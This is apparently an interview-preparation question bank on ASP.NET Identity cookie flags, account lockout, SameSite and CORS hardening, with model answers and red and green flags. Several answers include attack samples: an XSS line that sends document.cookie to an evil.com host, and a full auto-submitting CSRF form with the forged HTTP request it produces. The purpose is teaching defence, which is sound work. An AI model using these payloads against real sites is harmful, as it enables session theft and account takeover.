## SECTION C — ASP.NET IDENTITY, COOKIE SECURITY & LOCKOUT

> **Source:** Tasks 5–7 — password policy, account lockout, cookie hardening via `ConfigureApplicationCookie`.

---

### EASY

**C1.** [HIGH] What does `HttpOnly` on a cookie prevent? What does it NOT prevent?

<details>
<summary>The 5% Answer</summary>

**Prevents:** JavaScript accessing `document.cookie`. An XSS payload injected into the page cannot read the session token and exfiltrate it to `https://evil.com/steal?c=`.

**Does NOT prevent:**
- The browser sending the cookie automatically on every HTTP request (that's what cookies do by design)
- **CSRF** — the browser still includes `HttpOnly` cookies on cross-origin requests unless `SameSite` also restricts it
- **Network interception** — that's `Secure` (HTTPS only)
- XSS executing other actions in the victim's browser (making API calls, modifying DOM)

**Practical impact:** XSS can still perform actions *as* the user (make authenticated requests from the victim's browser tab) — it just can't steal the token and replay it from a different machine. `HttpOnly` prevents **session hijacking**, not **session abuse**.

**Full defence requires all three:**
| Flag | Prevents |
|---|---|
| `HttpOnly` | Cookie theft via `document.cookie` |
| `Secure` | Cookie sent over HTTP (MITM capture) |
| `SameSite=Strict` | Cookie attached to cross-site requests (CSRF) |

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"`HttpOnly` prevents XSS." `HttpOnly` prevents cookie theft via XSS. XSS itself — arbitrary JavaScript execution — is still fully functional. The attacker just can't steal the token to another machine.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that even with `HttpOnly`, XSS can call `fetch('/api/account/address', { method: 'PUT', body: ... })` from the victim's tab and the cookie is attached automatically. `HttpOnly` only blocks `document.cookie` — it doesn't prevent XSS-driven API abuse.

</details>

---

**C2.** [HIGH] What does `SlidingExpiration = false` mean for users? What is the security tradeoff vs `true`?

<details>
<summary>The 5% Answer</summary>

- **`false` (this project):** the cookie expires exactly `ExpireTimeSpan` (24h) from **login time**, regardless of activity. A user who logs in at 9am is logged out at 9am the next day even if they were actively using the app at 8:59am.
- **`true`:** the expiry resets to `ExpireTimeSpan` from the current time on each request. An active user never gets logged out.

**Security tradeoff:**
- `false` is more secure: abandoned sessions expire predictably. An attacker with a stolen session token has at most 24h of access regardless of usage.
- `true` is more user-friendly: no surprise logouts for active users. But a stolen session token remains valid indefinitely as long as anyone uses it — attacker-controlled activity extends the window.

This project chose `false` — e-commerce apps with stored payment info benefit from daily re-authentication. The UX cost (users log in once a day) is acceptable for the security gain.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"`SlidingExpiration = true` is always better UX." Not when the session can be stolen. Sliding expiration on a stolen session means indefinitely valid access — the attacker just keeps making requests to keep the token alive.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning PCI-DSS: payment card industry compliance requires re-authentication after periods of inactivity. `SlidingExpiration = false` with a 24h absolute expiry satisfies this requirement. Banking and fintech apps use `false` universally — session continuity is a security liability, not a feature.

</details>

---

### MEDIUM

**C3.** [HIGH] A user fails to log in 5 times. Walk through exactly what ASP.NET Identity does in the database and what subsequent attempts return.

<details>
<summary>The 5% Answer</summary>

**After the 5th failed attempt:**
1. Identity executes: `UPDATE AspNetUsers SET LockoutEnd = @now + 15min WHERE Id = @id`
2. Identity **resets `AccessFailedCount` to 0** simultaneously — the counter's job is done
3. Any subsequent login attempt during the lockout window:
   - Identity checks `LockoutEnd > UtcNow` **before** evaluating the password
   - If locked: returns `SignInResult.LockedOut` immediately, password not checked
   - Response to the client: `401 Unauthorized` — identical to wrong password (intentional, prevents enumeration)

**Database state during lockout:**
```sql
SELECT Email, LockoutEnd, AccessFailedCount
FROM AspNetUsers WHERE Email = 'test@test.com'
-- LockoutEnd: 2025-04-20 14:15:00 UTC  (future → locked)
-- AccessFailedCount: 0                  (reset, not 5)
```

**After `LockoutEnd` passes:**
- `UserManager.IsLockedOutAsync(user)` returns `false`
- Next failed attempt increments `AccessFailedCount` again from 0

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"After lockout the user needs an admin to reset their account." Lockout is time-based (`DefaultLockoutTimeSpan = 15min`), not permanent. No admin action needed unless `LockoutEnd = DateTime.MaxValue` (permanent lockout) is configured explicitly.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that returning the same 401 for "wrong password" AND "account locked" is a deliberate security design — a different status code would let attackers enumerate whether an account exists and whether it's currently locked, providing a timing oracle for targeted brute-force attacks.

</details>

---

**C4.** [HIGH] [OUT-OF-SCOPE] Compare `SameSite=Strict` vs `SameSite=Lax` for this project. Describe a real scenario where `Strict` would break something `Lax` wouldn't.

<details>
<summary>The 5% Answer</summary>

- **`Lax`:** cookie sent on top-level GET navigations (link clicks from external sites) + all same-site requests. Not sent on cross-site sub-requests (XHR/fetch/forms/images). ASP.NET Core default since .NET 6.
- **`Strict`:** cookie never sent on any cross-site request — including top-level GET navigations.

**Where `Strict` breaks things `Lax` doesn't:**

1. **"View your order" email links:** a user receives an order confirmation email and clicks the link. The browser navigates from the email client's domain to `skinet.com` — that's a cross-site navigation. `Strict` means no session cookie attached → user sees the login page despite having an active session.

2. **OAuth/Social login flows:** IdP (Google, GitHub) redirects back to your app after authentication. That redirect is cross-site. `Strict` → cookie not attached on redirect → app sees user as unauthenticated after successful OAuth.

3. **Bookmark/referral links from other sites:** sharing a product link on Twitter, clicking through an affiliate partner — all are cross-site navigations that `Strict` blocks.

**Why this project uses `Strict`:**
- No OAuth (cookie-only auth, no external IdPs in scope)
- The cost (re-login from email links) is acceptable
- Maximum CSRF protection is the priority

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"Always use `Strict` for maximum security." The right choice depends on architecture. A site with OAuth login, email links, or affiliate traffic should use `Lax` — `Strict` would silently break user flows that require cross-site navigation.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning **eTLD+1 same-site determination**: `app.skinet.com` and `api.skinet.com` are **same-site** — they share `skinet.com` as the registrable domain. `SameSite=Strict` doesn't block them. But `app.skinet.com` and `api.otherdomain.com` are **cross-site**. Knowing this is why `localhost:4200` → `localhost:7096` works in dev with `Strict` — both resolve to `localhost` eTLD+1.

</details>

---

**C5.** [HIGH] What does `ConfigureApplicationCookie` target specifically? What breaks if you use `AddCookie("MyCookie")` instead?

<details>
<summary>The 5% Answer</summary>

`ConfigureApplicationCookie` modifies the options for `IdentityConstants.ApplicationScheme` — the specific cookie scheme that `AddIdentityApiEndpoints` registers internally. It's equivalent to:
```csharp
services.Configure<CookieAuthenticationOptions>(IdentityConstants.ApplicationScheme, options => ...);
```

**What breaks with `AddCookie("MyCookie")`:**
This registers a **new, separate** cookie scheme named `"MyCookie"`. Identity's own scheme (`"Identity.Application"`) remains with default settings:
- `HttpOnly = true` (default, fine)
- `SecurePolicy = CookieSecurePolicy.SameAsRequest` (default — allows HTTP)
- `SameSite = SameSiteMode.Lax` (default — less restrictive)
- `ExpireTimeSpan = TimeSpan.FromDays(14)` (default — 2 weeks)

Your hardened settings apply to `"MyCookie"` — a scheme nothing uses. Identity continues using its unhardened scheme. You'd have a false sense of security.

**Correct:**
```csharp
services.ConfigureApplicationCookie(options => {
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.ExpireTimeSpan = TimeSpan.FromHours(24);
    options.SlidingExpiration = false;
});
```

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"Use `AddAuthentication().AddCookie(...)` with your settings." Same problem — that registers a new scheme. Identity uses `IdentityConstants.ApplicationScheme`, not whatever name you choose.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that `IdentityConstants.ApplicationScheme` is the literal string `"Identity.Application"` — you can verify in the ASP.NET Identity source. Calling `ConfigureApplicationCookie` is the idiomatic helper; calling `services.Configure<CookieAuthenticationOptions>("Identity.Application", ...)` is equivalent and more explicit about the scheme name.

</details>

---

**C6.** [HIGH] `options.Lockout.AllowedForNewUsers` defaults to `false`. This project explicitly sets it to `true`. What specific attack window does `true` close that the default leaves open?

<details>
<summary>The 5% Answer</summary>

**What the default (`false`) does:**
Identity's lockout code checks the per-user `AspNetUsers.LockoutEnabled` column **before** incrementing `AccessFailedCount`. With `AllowedForNewUsers = false`, `UserManager.CreateAsync(user, password)` stores `LockoutEnabled = false` on the row. Failed logins against that account never increment the counter → the `MaxFailedAccessAttempts = 5` threshold is never reached → **lockout never fires**.

```sql
-- Fresh user with the default
SELECT Email, LockoutEnabled, AccessFailedCount, LockoutEnd
FROM AspNetUsers WHERE Email = 'newuser@test.com'
-- LockoutEnabled: 0         (disabled — lockout never runs for this user)
-- AccessFailedCount: 0      (never incremented)
-- LockoutEnd: NULL          (never set regardless of attempt count)
```

**What `AllowedForNewUsers = true` changes:**
`CreateAsync` stores `LockoutEnabled = true`. Every failed login increments the counter; at 5 failures Identity locks the account per the configured window.

**The attack window the default leaves open:**
From account registration until someone explicitly enables lockout on that row, an attacker with the email can attempt **unlimited passwords**. Concretely:
- **Credential stuffing**: replay 10,000 leaked passwords from a different breach — all 10,000 HTTP attempts are valid with no throttling at the Identity layer
- **Targeted brute force**: even with a 12-char password policy, automated attacks that bias toward common patterns (`Pa$$w0rd`, `Summer2025!`) succeed regularly

With `true`, the window is closed from the moment the user is created — no post-registration admin step required.

**Why the default is `false`:**
Backwards compatibility with the pre-Identity-2.0 design where lockout was strictly opt-in per-user. Modern apps should always set `AllowedForNewUsers = true`.

**Production consequence:** with the default, every user registered before an admin notices the misconfiguration has an account that is **permanently** unprotected against credential stuffing — even after `AllowedForNewUsers = true` is added. Changing the config only affects users created after that point; existing rows keep `LockoutEnabled = 0` until you migrate them.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"Defaults are secure." In Identity, multiple lockout defaults are **permissive**: `AllowedForNewUsers = false`, `MaxFailedAccessAttempts = 5`, `DefaultLockoutTimeSpan = TimeSpan.FromMinutes(5)` (short enough that an attacker comfortably restarts brute force every 5 minutes). Assuming defaults are tight is the wrong mental model — read every lockout option.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Knowing that flipping `AllowedForNewUsers` to `true` **does not retroactively enable lockout on existing users** — Identity checks the per-row `LockoutEnabled`, not the options value, at login time. Migrating existing accounts requires a one-time SQL update:
```sql
UPDATE AspNetUsers SET LockoutEnabled = 1 WHERE LockoutEnabled = 0;
```
An audit step before enabling this globally: check `SELECT COUNT(*) WHERE LockoutEnabled = 0` to see how many accounts are currently unprotected.

</details>

---

### HARD

**C7.** [HIGH] [OUT-OF-SCOPE] Find the 3 security vulnerabilities in this cookie configuration and describe the attack each enables:

```csharp
services.ConfigureApplicationCookie(options => {
    options.Cookie.HttpOnly = false;
    options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest;
    options.Cookie.SameSite = SameSiteMode.None;
    options.ExpireTimeSpan = TimeSpan.FromDays(30);
    options.SlidingExpiration = true;
});
```

<details>
<summary>The 5% Answer</summary>

**Vulnerability 1 — `HttpOnly = false` → XSS-based session hijacking:**
JavaScript can read `document.cookie`. An XSS payload exfiltrates the session token:
```js
fetch('https://evil.com/steal?c=' + document.cookie)
```
The attacker receives the cookie, uses it from their own machine, and has full session access from anywhere — not just the victim's browser.

**Vulnerability 2 — `SecurePolicy = SameAsRequest` → MITM cookie theft:**
The cookie is transmitted in plaintext over HTTP. A network attacker (coffee shop WiFi, corporate proxy, ISP) reads the session token directly from unencrypted HTTP traffic. `CookieSecurePolicy.Always` forces HTTPS-only transmission.

**Vulnerability 3 — `SameSite = None` + `SlidingExpiration = true` → indefinite CSRF session:**
`None` allows cross-site cookie attachment — any site can make authenticated requests with the victim's session. With sliding expiration, a stolen (or attacker-kept-alive) session never expires while in use. An attacker who bookmarks `https://api.skinet.com/api/account/email?change=attacker@evil.com` can keep triggering it from the victim's browser indefinitely.

**Combined consequence:** XSS or MITM yields a 30-day, continuously renewable session token readable by JavaScript over HTTP, usable from any origin. Full account takeover with no expiration.

**Production consequence:** any XSS vulnerability (even a comment box or search field) becomes full account takeover with persistent access.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
Only identifying one vulnerability. A security-minded senior identifies all three independently and can articulate the specific attack for each. Partial answers suggest surface-level security knowledge.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that `SameSite=None` without `Secure` is silently upgraded to `Lax` by modern browsers (Chrome 80+). So the `SameAsRequest` policy inadvertently "saves" the `None` setting on HTTP connections — but the browser's protection is not a substitute for correct server configuration. Don't rely on browser behaviour to compensate for insecure cookie settings.

</details>

---

**C8.** [HIGH] `AccessFailedCount` is 0 after an account lockout. A junior developer says "the counter is broken and lockout isn't working." Walk through why this is correct behavior and how to correctly verify lockout status.

<details>
<summary>The 5% Answer</summary>

**Why `AccessFailedCount = 0` is correct by design:**
The counter's purpose is "count failed attempts toward the lockout trigger threshold." Once that threshold is hit and `LockoutEnd` is set, the counter's job is complete. Identity resets it atomically when setting `LockoutEnd`.

**Why it must reset:**
If the counter stayed at 5 after lockout, then after the 15-minute lockout expires, the user's very next failed login would immediately re-lock them (1 failure = already at max). Users would get permanently locked after a temporary lockout — any failed login would become permanent.

By resetting to 0, users get a fresh set of attempts after each lockout period.

**How to correctly verify lockout status:**
```csharp
// Correct check — uses LockoutEnd, not AccessFailedCount
var isLocked = await userManager.IsLockedOutAsync(user);

// Direct SQL check
SELECT Email, LockoutEnd, AccessFailedCount
FROM AspNetUsers WHERE Email = 'test@test.com'
-- Active lockout: LockoutEnd is a future UTC timestamp
-- Expired lockout: LockoutEnd is null or past
-- AccessFailedCount: irrelevant to lockout state
```

`UserManager.IsLockedOutAsync(user)` is the single authoritative check — don't write `user.AccessFailedCount >= MaxAttempts` in application code.

**Production consequence:** code that checks `AccessFailedCount >= MaxAttempts` to determine lockout state always returns `false` after lockout fires — the counter resets to 0. Locked accounts silently pass an `AccessFailedCount`-based check and are allowed to attempt login. The lockout exists in the DB; the check in application code is wrong.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"Set `MaxFailedAccessAttempts = 0` to fix the 'broken' counter." That disables lockout entirely — `0` means "no limit." The junior developer would accidentally remove brute-force protection while trying to debug it.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that `UserManager.GetLockoutEndDateAsync(user)` returns a `DateTimeOffset?` — null means never locked. A future value means currently locked. A past value means previously locked. This gives you the exact expiry time for user-facing "locked until X" messages, which improves UX over the generic "account locked" message.

</details>

---

**C9.** [HIGH] Design the complete authentication security configuration for this project. For each setting, justify the specific value chosen and identify what production attack it prevents.

<details>
<summary>The 5% Answer</summary>

```csharp
// Password policy
options.Password.RequiredLength = 12;           // entropy floor; NIST recommends ≥8, we use 12
options.Password.RequireUppercase = true;        // prevents trivially-lowercase passwords
options.Password.RequireDigit = true;            // prevents dictionary word attacks
options.Password.RequireNonAlphanumeric = true;  // forces character class diversity

// Lockout
options.Lockout.MaxFailedAccessAttempts = 5;     // 5 attempts before lockout
options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);  // 15min window
options.Lockout.AllowedForNewUsers = true;        // lockout applies from day 1, not after first success

// Cookie
options.Cookie.HttpOnly = true;          // prevents XSS cookie theft
options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // HTTPS-only, prevents MITM
options.Cookie.SameSite = SameSiteMode.Strict;  // prevents CSRF
options.ExpireTimeSpan = TimeSpan.FromHours(24); // 24h absolute session
options.SlidingExpiration = false;               // no renewal; stolen token expires predictably
```

| Setting | Value | Attack prevented |
|---|---|---|
| `RequiredLength = 12` | 12 chars | Dictionary/brute force |
| `MaxFailedAccessAttempts = 5` | 5 attempts | Online brute force |
| `DefaultLockoutTimeSpan = 15min` | 15 min | Automated credential stuffing |
| `HttpOnly = true` | true | XSS token exfiltration |
| `SecurePolicy = Always` | Always | MITM cookie interception |
| `SameSite = Strict` | Strict | CSRF (cross-site request forgery) |
| `ExpireTimeSpan = 24h` | 24 hours | Indefinite stolen session |
| `SlidingExpiration = false` | false | Session kept alive by attacker |

**NIST 2024 note:** SP 800-63B recommends checking passwords against known breached lists over enforcing complexity rules. Complexity rules cause predictable patterns ("Password1!"). Consider integrating `IPasswordValidator<AppUser>` with HaveIBeenPwned API for production hardening.

**Production consequence:** any one of the eight settings left at default degrades defence-in-depth silently — missing `HttpOnly` enables XSS cookie theft, missing `Secure` allows MITM on HTTP, missing `SameSite=Strict` enables CSRF. A partial security config produces no warnings, breaks no tests, and surfaces only after an incident.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"More complexity requirements = more security." NIST SP 800-63B (2024) explicitly disagrees: mandatory complexity rules encourage predictable patterns (appending `!` to a dictionary word). Length and breach-list checking provide more entropy than complexity rules.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning `IPasswordValidator<TUser>` — ASP.NET Identity's extensibility point for custom password validation. A `HaveIBeenPwnedPasswordValidator` that rejects passwords found in breach databases (using k-anonymity API calls to `api.pwnedpasswords.com`) is far more effective than any complexity rule. This is a 3-line integration using the `HibpPasswordValidator` NuGet package.

</details>

---

**C10.** [HIGH] [OUT-OF-SCOPE] Show the exact HTTP request a CSRF attack sends against this app when `SameSite=None; Secure` is misconfigured. Identify which header would be absent with `SameSite=Strict` and why that stops the attack.

<details>
<summary>The 5% Answer</summary>

**Attack setup:** victim is logged in to `https://skinet.com`. Attacker hosts `evil.com` with this auto-submitting page:

```html
<form id="f" method="POST" action="https://api.skinet.com/api/account/address">
  <input name="firstName" value="Attacker">
  <input name="line1" value="1 Evil St">
  <input name="city" value="Hacktown">
  <input name="country" value="GB">
</form>
<script>document.getElementById('f').submit();</script>
```

**Exact HTTP request the browser sends with `SameSite=None`:**
```
POST /api/account/address HTTP/1.1
Host: api.skinet.com
Origin: https://evil.com
Referer: https://evil.com/attack.html
Cookie: .AspNetCore.Identity.Application=CfDJ8KlQ3m...   ← browser attaches it
Content-Type: application/x-www-form-urlencoded

firstName=Attacker&line1=1+Evil+St&city=Hacktown&country=GB
```

**With `SameSite=Strict` — Cookie header is absent:**
```
POST /api/account/address HTTP/1.1
Host: api.skinet.com
Origin: https://evil.com
Referer: https://evil.com/attack.html
Content-Type: application/x-www-form-urlencoded
                                          ← no Cookie header
firstName=Attacker&line1=1+Evil+St&city=Hacktown&country=GB
```

`[Authorize]` returns `401` — the request is unauthenticated. Attack is dead.

**Why `Strict` stops it:** the browser's cookie-sending logic enforces `SameSite=Strict` before the request leaves the machine. The attacker cannot override it from JavaScript or form submission — it's a browser enforcement, not a server check.

**Production consequence:** with `SameSite=None`, any page the victim's browser loads can silently overwrite shipping addresses, trigger password resets, or initiate checkouts. The victim never sees a prompt.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** "Checking the `Origin` or `Referer` header on the server stops CSRF." Both headers can be absent (privacy settings, HTTPS→HTTP transitions) or spoofed in edge cases. `SameSite` enforcement is at the browser layer — the attacker has no influence over it.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Knowing the **synchronizer token** pattern as the fallback when `SameSite=Strict` isn't viable (OAuth redirects require `Lax`). A cryptographic token embedded in forms is validated server-side. The attacker's forged form can't read the victim's DOM (same-origin policy) and therefore can't include a valid token — even with the cookie attached.

</details>

---

**C11.** [MEDIUM] [OUT-OF-SCOPE] This project's CORS policy calls `WithOrigins(...)` instead of `AllowAnyOrigin()`. Why does `AllowAnyOrigin().AllowCredentials()` cause a runtime error in ASP.NET Core, and what does the exact exception say?

<details>
<summary>The 5% Answer</summary>

**ASP.NET Core throws at startup:**
```
InvalidOperationException: The CORS protocol does not allow specifying a wildcard
(any) origin and credentials at the same time. Configure either a wildcard origin
or a list of specific origins, not both.
```

**Why the spec prohibits it:**
RFC 6454 (Origins) and the CORS specification: if the server responds with `Access-Control-Allow-Origin: *`, the browser must ignore `Access-Control-Allow-Credentials: true`. A browser that sent cookies to `*` would expose session cookies to any site that happens to share the user's browser — a trivial CSRF vector. The RFC authors closed this deliberately.

**This project's fix:**
```csharp
services.AddCors(options => options.AddPolicy("CorsPolicy", policy =>
    policy
        .WithOrigins(
            "http://localhost:4200",
            "https://localhost:4200",
            "https://skinet-2025-test.azurewebsites.net")
        .AllowAnyHeader()
        .AllowAnyMethod()
        .AllowCredentials()));   // safe — specific origins, not wildcard
```

`AllowAnyHeader()` is safe here — the origin whitelist is the real protection. Any origin not in the list gets a CORS rejection at the preflight stage.

**Production consequence:** `AllowAnyOrigin()` with `AllowCredentials()` throws before the app accepts any requests — you'd catch it in CI or on first startup, not in prod. But removing `AllowCredentials()` to make it compile creates a silent regression — Angular's auth cookies are never sent, all authenticated API calls return 401.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** "Remove `AllowCredentials()` to fix the error — we'll add it back later." Without `AllowCredentials()`, the browser strips cookies from all cross-origin requests regardless of `withCredentials: true` on the Angular side. The fix silently breaks authentication.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Knowing that `AllowAnyHeader()` is acceptable with specific origins because the origin whitelist is the CORS security boundary, not the header list. Headers are checked post-origin validation — an attacker whose origin isn't in the list never reaches the header check.

</details>

---

## ⚡ Syntax Quick-Fire

**C-QF1.** [HIGH] What is the literal string value of `IdentityConstants.ApplicationScheme`?

<details>
<summary>The 5% Answer</summary>

`"Identity.Application"` — the internal scheme name that `AddIdentityApiEndpoints` registers. `ConfigureApplicationCookie` is a helper that targets exactly this scheme. Calling `AddCookie("MyCookie")` registers a separate scheme that nothing uses — Identity's cookie keeps its insecure defaults.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** Registering a new cookie scheme with custom settings and assuming it applies to Identity. The hardened settings silently apply to an unused scheme — Identity's `"Identity.Application"` cookie remains with defaults (`SecurePolicy.SameAsRequest`, `SameSite.Lax`, 14-day expiry).

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Knowing `services.Configure<CookieAuthenticationOptions>(IdentityConstants.ApplicationScheme, opts => ...)` is equivalent to `ConfigureApplicationCookie` — more explicit about what scheme is being targeted, useful for debugging or when configuring multiple schemes.

</details>

---

**C-QF2.** [HIGH] C# — `DateTime` vs `DateTimeOffset` — which does ASP.NET Identity use for `LockoutEnd` and why?

<details>
<summary>The 5% Answer</summary>

Identity uses **`DateTimeOffset?`** for `LockoutEnd`. `DateTimeOffset` always stores the UTC offset alongside the value — comparisons are unambiguous regardless of the server's local time zone. `DateTime.Kind` can be `Unspecified`, causing silent mis-comparisons when a UTC value is treated as local time.

```csharp
// Comparing a UTC DateTime to server local time silently returns wrong results
// DateTimeOffset carries offset — comparison is always correct
var isLocked = user.LockoutEnd > DateTimeOffset.UtcNow;
```

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** Using `DateTime.Now` to compare against `LockoutEnd`. `DateTime.Now` is server local time; `LockoutEnd` is stored as UTC. On a server not set to UTC, the comparison is off by the UTC offset — users are locked out longer or shorter than configured.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Always using `DateTimeOffset.UtcNow` for timestamps in any distributed or cloud system. Azure VMs default to UTC, but developer machines and some legacy servers don't — `DateTimeOffset` makes the offset explicit and eliminates the entire class of time zone bugs.

</details>

---

**C-QF3.** [HIGH] After a password reset, does the user's existing auth cookie immediately become invalid?

<details>
<summary>The 5% Answer</summary>

**Not by default.** The cookie contains a security stamp issued at login time. Without `SecurityStampValidator`, the server never checks whether the stamp is still current — a stolen session cookie remains valid until natural expiry even after a password change.

**Enable it:**
```csharp
services.Configure<SecurityStampValidatorOptions>(opts =>
    opts.ValidationInterval = TimeSpan.FromMinutes(30));
```

Identity updates the security stamp on password change, role change, or explicit invalidation. On the next request after the validation interval, the validator detects the stale stamp and rejects the cookie — forcing re-login.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** "The cookie is tied to the password hash, so it expires when the password changes." The cookie is tied to the **security stamp** — a separate random value. It is not derived from the password hash. Without the validator running, the stamp is never checked post-login.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Setting a short `ValidationInterval` (e.g., 30 minutes) for high-security apps — any session in use gets re-validated against the current security stamp every 30 minutes. Combine with `SlidingExpiration = false` for a predictable, auditable session lifecycle.

</details>
